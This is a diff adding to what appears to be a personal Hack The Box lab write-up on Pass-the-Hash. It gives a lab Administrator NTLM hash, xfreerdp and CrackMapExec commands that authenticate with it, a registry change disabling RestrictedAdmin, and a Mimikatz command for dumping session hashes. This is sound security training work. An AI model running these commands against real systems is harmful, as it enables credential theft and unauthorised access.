@@ -110,3 +110,38 @@ Once the registry key is added, we can use `xfreerdp` with the option `/pth` to 
 ```shell-session
 ElFelixi0@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ```
+
+_**creds ->**_
+
+Administrator:30B3783CE2ABF1AF70F77D0660CF3453
+
+_**Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.**_
+
+<figure><img src="../../../.gitbook/assets/image (1460).png" alt=""><figcaption><p>xfreerdp /v:10.129.18.140 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453</p></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (1461).png" alt=""><figcaption><p>cme smb 10.129.18.140 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'type C:\pth.txt'</p></figcaption></figure>
+
+_**Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?**_
+
+```
+cme smb 10.129.18.140 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+```
+
+<figure><img src="../../../.gitbook/assets/image (1462).png" alt=""><figcaption></figcaption></figure>
+
+So now i can connect through RDP:
+
+<figure><img src="../../../.gitbook/assets/image (1463).png" alt=""><figcaption><p>xfreerdp /v:10.129.18.140 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453</p></figcaption></figure>
+
+Then i used an old documentation i did long ago to dump NT hashes using mimikatz:
+
+{% embed url="https://felix-billieres.gitbook.io/felix-billieres/active-directory/active-directory-interview-prep-handbook#how-do-we-extract-the-nt-hashes" %}
+
+```
+mimikatz.exe privilege::debug "sekurlsa::logonpasswords /user:Administrator /rc4:30B3783CE2ABF1AF70F77D0660CF3453 /domain:inlanefreight.htb
+```
+
+<figure><img src="../../../.gitbook/assets/image (1464).png" alt=""><figcaption><p>c39f2beb3d2ec06a62cb887fb391dee0</p></figcaption></figure>
+
+_**Using David's hash, perform a Pass the Hash attack to connect to the shared folder \DC01\david and read the file david.txt.**_
+
